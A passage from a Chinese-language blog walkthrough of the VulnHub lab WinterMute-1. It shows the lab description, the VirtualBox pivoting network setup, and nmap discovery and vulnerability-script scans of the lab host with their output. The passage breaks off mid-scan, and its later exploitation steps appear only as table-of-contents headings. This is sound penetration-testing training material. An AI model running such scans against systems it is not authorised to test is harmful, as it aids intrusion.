<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="名称名称：WinterMute：1发布日期：2018年7月5日 下载 Download: https:&#x2F;&#x2F;drive.google.com&#x2F;open?id&#x3D;1bHgdx0iI24jv7MDzKcrIPtd9rVFaVokR Download (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;wintermute&#x2F;Wintermute-v1.zip Download (T">
<meta property="og:type" content="article">
<meta property="og:title" content="vulnhub靶机渗透[WinterMute-1]">
<meta property="og:url" content="https://fdlucifer.github.io/2020/01/13/WinterMute-1/index.html">
<meta property="og:site_name" content="fdvoid0&#39;s blog">
<meta property="og:description" content="名称名称：WinterMute：1发布日期：2018年7月5日 下载 Download: https:&#x2F;&#x2F;drive.google.com&#x2F;open?id&#x3D;1bHgdx0iI24jv7MDzKcrIPtd9rVFaVokR Download (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;wintermute&#x2F;Wintermute-v1.zip Download (T">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://www.baslub.nl/wp-content/uploads/2019/01/Network-setup-768x332.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub156.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub157.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub158.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub159.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub160.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub161.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub162.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub163.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub164.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub165.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub167.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub168.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub166.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub169.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub170.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg">
<meta property="article:published_time" content="2020-01-13T05:48:05.000Z">
<meta property="article:modified_time" content="2020-08-16T17:00:57.537Z">
<meta property="article:author" content="fdvoid0">
<meta property="article:tag" content="vulnhub靶机练习">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.baslub.nl/wp-content/uploads/2019/01/Network-setup-768x332.png">


<link rel="canonical" href="https://fdlucifer.github.io/2020/01/13/WinterMute-1/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2020/01/13/WinterMute-1/","path":"2020/01/13/WinterMute-1/","title":"vulnhub靶机渗透[WinterMute-1]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>vulnhub靶机渗透[WinterMute-1] | fdvoid0's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="fdvoid0's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">fdvoid0's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by fdvoid0</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">43</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">49</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">210</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8D%E7%A7%B0"><span class="nav-number">1.</span> <span class="nav-text">名称</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD"><span class="nav-number">2.</span> <span class="nav-text">下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%8F%E8%BF%B0"><span class="nav-number">3.</span> <span class="nav-text">描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE"><span class="nav-number">4.</span> <span class="nav-text">网络配置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Wintermute-Straylight"><span class="nav-number">4.1.</span> <span class="nav-text">Wintermute-Straylight</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">5.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getshell"><span class="nav-number">6.</span> <span class="nav-text">getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">7.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Wintermute-Neuromancer"><span class="nav-number">7.1.</span> <span class="nav-text">Wintermute-Neuromancer</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getshell-1"><span class="nav-number">8.</span> <span class="nav-text">getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%831"><span class="nav-number">9.</span> <span class="nav-text">提权1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%832"><span class="nav-number">10.</span> <span class="nav-text">提权2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A41%EF%BC%9A%E9%9C%80%E8%A6%81%E9%80%82%E5%BD%93%E7%9A%84TTY%E4%BC%9A%E8%AF%9D"><span class="nav-number"></span> <span class="nav-text">步骤1：需要适当的TTY会话</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A42%EF%BC%9A%E8%8E%B7%E5%BE%97TTY-%E9%87%8D%E7%94%A8%E7%9A%84%E8%AF%81%E4%B9%A6%E9%80%89%E9%A1%B9"><span class="nav-number"></span> <span class="nav-text">步骤2：获得TTY-重用的证书选项</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A43%EF%BC%9A%E8%8E%B7%E5%BE%97TTY-%E2%80%9Cta%E2%80%9D%E5%B8%90%E6%88%B7%E7%9A%84SSH%E5%AF%86%E9%92%A5%E8%B7%AF%E7%94%B1"><span class="nav-number"></span> <span class="nav-text">步骤3：获得TTY-“ta”帐户的SSH密钥路由</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A44%EF%BC%9A%E9%80%89%E6%8B%A9%E6%8F%90%E6%9D%83%E5%88%A9%E7%94%A8%E9%80%94%E5%BE%84"><span class="nav-number"></span> <span class="nav-text">步骤4：选择提权利用途径</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A45%EF%BC%9A%E5%87%86%E5%A4%87%E5%92%8C%E4%BD%BF%E7%94%A8%E5%AE%B9%E5%99%A8-%E6%A6%82%E8%BF%B0"><span class="nav-number"></span> <span class="nav-text">步骤5：准备和使用容器-概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A46-%E5%AF%BC%E5%85%A5%E5%AE%B9%E5%99%A8%E6%98%A0%E5%83%8F%E3%80%82"><span class="nav-number"></span> <span class="nav-text">步骤6-导入容器映像。</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A47-%E8%AF%81%E6%98%8E%E6%88%91%E4%BB%AC%E5%AF%B9Neuromancer%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%85%B7%E6%9C%89%E6%A0%B9%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90"><span class="nav-number"></span> <span class="nav-text">步骤7-证明我们对Neuromancer文件系统具有根目录访问权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A48%EF%BC%9ASSH%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90"><span class="nav-number"></span> <span class="nav-text">步骤8：SSH密钥生成</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A49%EF%BC%9A%E5%B0%86%E5%AF%86%E9%92%A5%E5%A4%8D%E5%88%B6%E5%88%B0%E6%94%BB%E5%87%BB%E6%9C%BA%E4%B8%AD"><span class="nav-number"></span> <span class="nav-text">步骤9：将密钥复制到攻击机中</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%832%E6%80%BB%E7%BB%93"><span class="nav-number">0.1.</span> <span class="nav-text">提权2总结</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="fdvoid0"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">fdvoid0</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">210</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">49</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vQGZkdm9pZDA=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;@fdvoid0"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/01/13/WinterMute-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="fdvoid0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fdvoid0's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="vulnhub靶机渗透[WinterMute-1] | fdvoid0's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          vulnhub靶机渗透[WinterMute-1]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2020-01-13 13:48:05" itemprop="dateCreated datePublished" datetime="2020-01-13T13:48:05+08:00">2020-01-13</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2020-08-17 01:00:57" itemprop="dateModified" datetime="2020-08-17T01:00:57+08:00">2020-08-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/vulnhub-walkthrough/" itemprop="url" rel="index"><span itemprop="name">vulnhub walkthrough</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>11k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>39 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：WinterMute：1<br>发布日期：2018年7月5日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MWJIZ2R4MGlJMjRqdjdNRHpLY3JJUHRkOXJWRmFWb2tS">https://drive.google.com/open?id=1bHgdx0iI24jv7MDzKcrIPtd9rVFaVokR<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS93aW50ZXJtdXRlL1dpbnRlcm11dGUtdjEuemlw">https://download.vulnhub.com/wintermute/Wintermute-v1.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS93aW50ZXJtdXRlL1dpbnRlcm11dGUtdjEuemlwLnRvcnJlbnQ=">https://download.vulnhub.com/wintermute/Wintermute-v1.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<span id="more"></span>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>一个新的OSCP风格实验室，涉及2台易受攻击的机器，以赛博朋克经典Neuromancer为主题-任何网络安全爱好者都必须阅读。该实验室利用了数据透视和后期开发，而我发现其他OSCP预处理实验室似乎缺乏。目标是在两台计算机上都root。您只需要默认的Kali Linux。</p>
<p>我将其评为“中级”。没有缓冲区溢出或漏洞利用开发-可以使用小的字典进行任何必要的密码破解。它与OSCP盒而不是CTF更为相关。我已经测试了很多，但是如果您发现任何问题或需要在这里微调我。</p>
<p>压缩下载中包含Virtual Box Lab的安装说明，但是这里有一个简短的摘要：Straylight-模拟带有2个NICS的面向公众的服务器。首先盖上此盖，然后转到最后一台机器。Neuromancer-在具有1个NIC的非公共网络中。您的Kali框应仅与Straylight位于同一虚拟网络上。需要VirtualBox。VMware无法正确导入。</p>
<h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><p>Wintermute Vitrual Box设置指南本练习利用了数据透视，因此需要正确设置VirtualBox网络。所有动态ip都快速简便。运行或将每台计算机导入Virtual Box（文件&gt;&gt;导入设备）</p>
<p>STRAYLIGHT（网络＃1和＃2）-这是第一台获得root权限的计算机。</p>
<ul>
<li>Adapter 1 <ul>
<li>Host-only Adapter</li>
<li>VirtualBox Host-Only Ethernet Adapter #1<br>  Advanced (we want 2 NIC’s, each on a separate network)</li>
<li>Adapter Type - Intel PRO&#x2F;1000 T Server</li>
</ul>
</li>
<li>Adapter 2<ul>
<li>Host-only Adapter</li>
<li>VirtualBox Host-Only Ethernet Adapter #2<br>  Advanced</li>
<li>Adapter Type - Intel PRO&#x2F;1000 MT Desktop (or other adapter type different than network #1).</li>
</ul>
</li>
</ul>
<p>NEUROMANCER（网络2）-这是获得root的最终机器。设置为具有1个网络。仅通过Straylight使用仅限主机的Eth适配器＃2访问。</p>
<ul>
<li>Adapter 1<ul>
<li>Host-only Adapter</li>
<li>VirtualBox Host-Only Ethernet Adapter #2<br>  Advanced</li>
<li>Adapter Type - Intel PRO&#x2F;1000 MT Desktop</li>
</ul>
</li>
</ul>
<p>KALI（网络＃1）-您的攻击机器仅应在仅主机的适配器上设置，Straylight处于打开状态，如果选择，则为NAT。-您不应该从Kali盒中对Neuromancer进行ping操作。如果可以的话，你在作弊。</p>
<ul>
<li>Adapter 1<ul>
<li>Host-only Adapter</li>
<li>VirtualBox Host-Only Ethernet Adapter #1</li>
</ul>
</li>
</ul>
<p><img src="https://www.baslub.nl/wp-content/uploads/2019/01/Network-setup-768x332.png"></p>
<p>网络这样设置以便于通关了STRAYLIGHT之后，再通关NEUROMANCER</p>
<h4 id="Wintermute-Straylight"><a href="#Wintermute-Straylight" class="headerlink" title="Wintermute-Straylight"></a>Wintermute-Straylight</h4><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.111</span><br><span class="line">Host is up (0.00011s latency).</span><br><span class="line">MAC Address: 08:00:27:50:96:D9 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -sV -Pn -T5 -v -A --script=vuln 192.168.56.111</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">25/tcp   open  smtp    Postfix smtpd</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| smtp-vuln-cve2010-4344: </span><br><span class="line">|_  The SMTP server is not Exim: NOT VULNERABLE</span><br><span class="line">| ssl-dh-params: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use anonymous</span><br><span class="line">|       Diffie-Hellman key exchange only provide protection against passive</span><br><span class="line">|       eavesdropping, and are vulnerable to active man-in-the-middle attacks</span><br><span class="line">|       <span class="built_in">which</span> could completely compromise the confidentiality and integrity</span><br><span class="line">|       of any data exchanged over the resulting session.</span><br><span class="line">|     Check results:</span><br><span class="line">|       ANONYMOUS DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DH_anon_WITH_AES_256_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 2048</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 2048</span><br><span class="line">|     References:</span><br><span class="line">|_      https://www.ietf.org/rfc/rfc2246.txt</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /manual/: Potentially interesting folder</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-stored-xss: Couldn<span 